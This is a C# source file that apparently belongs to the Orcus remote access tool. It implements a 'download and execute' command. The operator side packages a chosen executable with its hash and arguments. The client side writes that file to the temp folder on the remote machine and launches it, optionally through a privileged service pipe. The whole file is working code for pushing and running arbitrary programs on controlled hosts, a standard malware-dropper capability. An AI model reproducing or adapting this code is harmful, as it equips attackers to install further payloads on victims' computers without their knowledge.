using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Orcus.Plugins;
using Orcus.Plugins.PropertyGrid;
using Orcus.Plugins.PropertyGrid.Attributes;
using Orcus.Plugins.StaticCommands;
using Orcus.Shared.Utilities;

namespace Orcus.StaticCommands.System
{
    public class DownloadAndExecuteCommand : StaticCommand
    {
        public DownloadAndExecuteCommand()
        {
            this.RegisterProperty(() => Path, Resources.StaticCommands.Path,
                Resources.StaticCommands.System_DownloadAndExecuteCommand_Path_Description, Resources.StaticCommands.Common)
                .RegisterProperty(() => Parameter, Resources.StaticCommands.Arguments, Resources.StaticCommands.ArgumentsDescription, Resources.StaticCommands.Common)
                .RegisterProperty(() => ExecuteUsingService, Resources.StaticCommands.System_DownloadAndExecuteCommand_ExecuteUsingService,
                    Resources.StaticCommands.System_DownloadAndExecuteCommand_ExecuteUsingService_Description, Resources.StaticCommands.Common);
        }

        [Path(PathMode = PathMode.File, Filter = "Executable|*.exe|All files|*.*")]
        public string Path { get; set; }
        public string Parameter { get; set; }
        public bool ExecuteUsingService { get; set; }

        public override Guid CommandId { get; } = new Guid(0x77d9b4aa, 0xf3b8, 0x7948, 0xad, 0xca, 0x97, 0xe5, 0xb2,
            0x11, 0xc1, 0xf3);

        public override string Name { get; } = Resources.StaticCommands.System_DownloadAndExecuteCommand_Name;
        public override string Description { get; } = Resources.StaticCommands.System_DownloadAndExecuteCommand_Description;
        public override StaticCommandCategory Category { get; } = StaticCommandCategory.System;

        public override InputValidationResult ValidateInput()
        {
            if (Path.IsNullOrWhiteSpace())
                return InputValidationResult.Error(Resources.StaticCommands.PathCannotBeEmpty);

            var file = new FileInfo(Path);
            if (!file.Exists)
                return
                    InputValidationResult.Error(string.Format(Resources.StaticCommands.TheFileDoesnotExist, file.Name));
            if (file.Length > 1024 * 1024 * 5)
                return new InputValidationResult(Resources.StaticCommands.WarningFileAbove5MiB,
                    ValidationState.WarningYesNo);

            return InputValidationResult.Successful;
        }

        public override CommandParameter GetCommandParameter()
        {
            var parameterBytes = Parameter == null ? new byte[0] : Encoding.UTF8.GetBytes(Parameter);
            var fileName = Encoding.UTF8.GetBytes(global::System.IO.Path.GetFileName(Path));

            using (var fs = new FileStream(Path, FileMode.Open, FileAccess.Read))
            {
                byte[] hash;

                using (var sha256 = new SHA256Managed())
                    hash = sha256.ComputeHash(fs);

                fs.Position = 0;

                //This will be compressed automatically
                var package = new byte[fs.Length + 32 + 4 + parameterBytes.Length + 1 + 4 + fileName.Length];
                //we copy the parameter
                Array.Copy(BitConverter.GetBytes(parameterBytes.Length), package, 4);
                if (parameterBytes.Length > 0)
                    Array.Copy(parameterBytes, 0, package, 4, parameterBytes.Length);
                //we copy the hash
                Array.Copy(hash, 0, package, 4 + parameterBytes.Length, 32);
                //we copy the file name
                Array.Copy(BitConverter.GetBytes(fileName.Length), 0, package, 4 + parameterBytes.Length + 32, 4);
                Array.Copy(fileName, 0, package, 4 + parameterBytes.Length + 32 + 4, fileName.Length);
                //we copy the file
                fs.Read(package, 4 + parameterBytes.Length + 32 + 4 + fileName.Length, (int)fs.Length);
                package[package.Length - 1] = (byte)(ExecuteUsingService ? 1 : 0);

                return new CommandParameter(package);
            }
        }

        public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory, IClientInfo clientInfo)
        {
            var parameter = commandParameter.Data;

            var parameterLength = BitConverter.ToInt32(parameter, 0);
            string fileParameter = "";
            if (parameterLength > 0)
                fileParameter = Encoding.UTF8.GetString(parameter, 4, parameterLength);

            var hash = parameter.Skip(parameterLength + 4).Take(32).ToArray();

            var fileNameLength = BitConverter.ToInt32(parameter, 4 + parameterLength + 32);
            var fileName = Encoding.UTF8.GetString(parameter, 4 + parameterLength + 32 + 4, fileNameLength);

            var tempFile = new FileInfo(FileExtensions.MakeUnique(global::System.IO.Path.Combine(global::System.IO.Path.GetTempPath(), fileName)));
            byte[] fileHash;

            feedbackFactory.StatusMessage("Write file bytes to disk");
            using (var fs = new FileStream(tempFile.FullName, FileMode.Create, FileAccess.ReadWrite, FileShare.None))
            {
                fs.Write(parameter, 32 + 4 + parameterLength + 4 + fileNameLength, parameter.Length - (32 + 4 + parameterLength + 4 + fileNameLength + 1));
                fs.Position = 0;
                using (var sha256 = new SHA256Managed())
                    fileHash = sha256.ComputeHash(fs);
            }

            if (!hash.SequenceEqual(fileHash))
            {
                tempFile.Delete();
                feedbackFactory.Failed("File hash does not match the give hash");
                return;
            }

            var executeUsingService = parameter[parameter.Length - 1] == 1;

            try
            {
                if (executeUsingService && clientInfo.ClientOperator.ToolBase.ServicePipe != null)
                {
                    feedbackFactory.StatusMessage("File successfully written to disk. Execute file using service");
                    clientInfo.ClientOperator.ToolBase.ServicePipe.StartProcess(tempFile.FullName, fileParameter);
                }
                else
                {
                    feedbackFactory.StatusMessage("File successfully written to disk. Execute file");
                    Process.Start(tempFile.FullName, fileParameter);
                }
            }
            catch (Exception ex)
            {
                feedbackFactory.Failed("Couldn't execute file: " + ex.Message);
            }
        }
    }
}